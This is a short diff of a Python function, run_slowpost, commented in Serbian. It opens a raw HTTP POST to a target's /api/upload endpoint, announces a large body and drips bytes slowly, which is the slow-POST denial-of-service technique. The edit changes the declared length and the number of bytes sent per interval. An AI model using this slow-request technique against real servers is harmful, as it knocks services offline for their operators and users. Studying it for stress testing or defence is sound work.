@@ -30,7 +30,7 @@ def run_slowpost(target_host, interval, stop_event, stats): # interval cekanja
         headers = (
             f"POST /api/upload HTTP/1.1\r\n"
             f"Host: {target_host}\r\n"
-            f"Content-Length: 1000000\r\n"
+            f"Content-Length: 8192\r\n"
             f"Content-Type: application/octet-stream\r\n"
             f"\r\n"
         ) 
@@ -39,7 +39,7 @@ def run_slowpost(target_host, interval, stop_event, stats): # interval cekanja
 
         connected = True
         while not stop_event.wait(interval): # wait vraca true ako je event setovan
-            sock.send(b"a") # jedan bajt tela - Content-Length kaze da stize 1000000, nikad ne stigne na vreme
+            sock.send(b"aaaaaaaaaa") 
 
     except OSError:
         pass
